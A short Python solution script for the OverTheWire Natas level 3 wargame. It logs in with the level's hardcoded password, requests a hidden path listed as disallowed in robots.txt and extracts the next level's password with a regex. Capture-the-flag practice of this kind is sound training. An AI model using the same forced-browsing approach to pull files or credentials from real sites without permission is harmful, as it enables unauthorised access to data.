from pwn import *
import requests
import re
import html

username = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas4 password, Hold on! ")
session = requests.session()
#web = session.get(url + "/robots.txt" , auth = (username, password)).text
web = session.get(url + "/s3cr3t/users.txt" , auth = (username, password)).text
#print(web)
print("The password for natas4 is === " + re.findall("[A-Za-z0-9]{32}", web)[0])
